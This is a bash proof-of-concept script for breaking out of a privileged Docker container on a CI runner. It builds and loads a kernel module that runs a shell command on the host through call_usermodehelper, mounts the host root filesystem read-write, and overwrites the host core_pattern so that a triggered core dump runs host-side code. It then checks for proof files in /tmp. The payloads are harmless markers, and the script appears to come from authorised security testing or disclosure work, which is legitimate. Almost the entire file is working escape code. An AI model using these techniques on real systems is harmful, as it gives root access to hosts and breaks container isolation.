#!/usr/bin/env bash
# Privileged escape PoC chain, runner-side orchestration.
# PoC1: write marker into host root fs via rw /host mount
# PoC2: host core_pattern overwrite -> host-side code exec on core dump
# PoC3: kernel module load (CAP_SYS_MODULE) -> call_usermodehelper on host
set -u
mkdir -p reports
R=reports/poc-privileged-report.txt
exec > >(tee -a "$R") 2>&1

echo "== step0: host baseline"
uname -a
echo "core_pattern(before): $(cat /proc/sys/kernel/core_pattern)"
ls -la /tmp/escape-poc-marker /tmp/pwned-core-pattern /tmp/pwned-kernel-module 2>/dev/null || echo "(no pre-existing proofs)"

echo "== step1: build kernel module on host (tolerant, verbose errors)"
KVER=$(uname -r)
sudo apt-get update -qq >/dev/null 2>&1 || true
sudo apt-get install -y -qq "linux-headers-$KVER" bc bison flex libelf-dev >/dev/null 2>&1 || echo "(deps install failed)"
echo "build symlink: $(ls -la "/lib/modules/$KVER/build" 2>/dev/null | head -1 || echo MISSING)"
MODDIR=/tmp/modpoc; mkdir -p "$MODDIR"
cat > "$MODDIR/escape_poc.c" <<'EOC'
#include <linux/module.h>
#include <linux/init.h>
static int __init init_poc(void) {
    char *argv[] = {"/bin/sh", "-c", "echo module-escape-proof $(date -u +%FT%TZ) > /tmp/pwned-kernel-module", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
    printk(KERN_INFO "escape-poc module loaded\n");
    return 0;
}
static void __exit exit_poc(void) { printk(KERN_INFO "escape-poc module unloaded\n"); }
module_init(init_poc);
module_exit(exit_poc);
MODULE_LICENSE("GPL");
EOC
printf 'obj-m += escape_poc.o\n' > "$MODDIR/Makefile"
if [ -e "/lib/modules/$KVER/build" ]; then
  if (cd "$MODDIR" && make > make.log 2>&1); then
    echo "module built: $(ls -la "$MODDIR/escape_poc.ko" 2>/dev/null)"
  else
    echo "(module build FAILED) make.log tail:"
    tail -20 "$MODDIR/make.log"
  fi
else
  echo "(no kernel build dir under /lib/modules: $(ls /lib/modules/ 2>/dev/null), module PoC will be skipped)"
fi

echo "== step2: run privileged container PoCs"
DOCKER_ARGS="--privileged -v /:/host"
[ -f "$MODDIR/escape_poc.ko" ] && DOCKER_ARGS="$DOCKER_ARGS -v $MODDIR:/modpoc -v /lib/modules:/lib/modules"
docker run --rm $DOCKER_ARGS -v "$PWD":/lab alpine:3.19 sh /lab/scripts/poc-in-privileged.sh

echo "== step3: trigger core dump on host (core_pattern pipe should fire)"
ulimit -c unlimited
sleep 10 & CPID=$!
kill -SEGV $CPID 2>/dev/null || true
sleep 3

echo "== step4: host-side verification (authoritative)"
echo "-- [poc1] marker visible on host /tmp:"
cat /tmp/escape-poc-marker 2>/dev/null || echo "MISSING"
echo "-- [poc2] core_pattern escape proof (file created by host kernel pipe):"
cat /tmp/pwned-core-pattern 2>/dev/null || echo "MISSING"
echo "-- [poc3] kernel module escape proof (call_usermodehelper file):"
cat /tmp/pwned-kernel-module 2>/dev/null || echo "MISSING"
echo "== restore core_pattern"
(echo 'core' > /proc/sys/kernel/core_pattern) 2>/dev/null || sudo sh -c "echo core > /proc/sys/kernel/core_pattern" || true
echo "core_pattern(after): $(cat /proc/sys/kernel/core_pattern)"
